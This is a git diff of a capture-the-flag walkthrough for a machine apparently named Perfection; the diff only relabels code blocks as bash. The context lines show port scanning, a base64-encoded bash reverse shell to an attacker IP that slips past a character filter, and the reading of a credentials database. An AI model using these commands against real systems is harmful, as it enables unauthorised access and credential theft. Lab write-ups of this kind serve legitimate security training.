@@ -24,7 +24,7 @@ Let's go look for the open ports in the machine using `nmap`:
 
 `nmap -Pn -n -sS -p- --open -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.253`
 
-```
+```bash
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
@@ -34,7 +34,7 @@ PORT   STATE SERVICE
 
 We fine tune the scan to see if we can get more information about the running services:
 
-```
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -84,7 +84,7 @@ The first thing is start a listener on our machine:
 
 Now, we need a reverse shell capable to avoid the "bad characters" protection, so we encoded it on base64:
 
-```
+```bash
 echo "bash  -i >& /dev/tcp/10.10.16.108/12345  0>&1" | base64
 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg==
 ```
@@ -119,7 +119,7 @@ We send the request and we got shell!
 
 First thing is upgrading the tty to be able to work comfortably:
 
-```
+```bash
 script /dev/null -c bash
 ctrl+z
 stty raw -echo; fg
@@ -130,14 +130,14 @@ stty rows 56 columns 209
 
 Now, we can start collecting information about our new user:
 
-```
+```bash
 susan@perfection:~/ruby_app$ whoami
 susan
 susan@perfection:~/ruby_app$ id
 uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
 ```
 
-```
+```bash
 susan@perfection:~$ ls -lA
 drwxr-xr-x 2 root  root    4096 Oct 27 10:36 Migration
 drwxr-xr-x 4 root  susan   4096 Oct 27 10:36 ruby_app
@@ -150,7 +150,7 @@ We got our user flag:
 
 We still  need to escalate privileges, so we keep looking.
 
-```
+```bash
 susan@perfection:~$ ls -R Migration/
 Migration/:
 pupilpath_credentials.db
@@ -176,14 +176,14 @@ about.erb  index.erb  weighted_grade.erb  weighted_grade_results.erb
 
 We see an interesting file: `pupilpath_credentials.db`, so we are going to continue investigating there:
 
-```
+```bash
 susan@perfection:~$ file Migration/pupilpath_credentials.db
 Migration/pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6
 ```
 
 A sqlite database called credentials... Let's see what contains!
 
-```
+```bash
 $ sqlite3 pupilpath_credentials.database
 
 sqlite> .tables
@@ -201,7 +201,7 @@ We have some users with their passwords hashes.
 
 If we review Susan's mails, we will find some useful information:
 
-```
+```bash
 $ cat /var/mail/susan
 Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
 
@@ -226,7 +226,7 @@ After a while we will have Susan's password, and we will look if she has sudo ca
 
 ## Privilege escalation
 
-```
+```bash
 $ sudo -l
 [sudo] password for susan:
 Matching Defaults entries for susan on perfection:
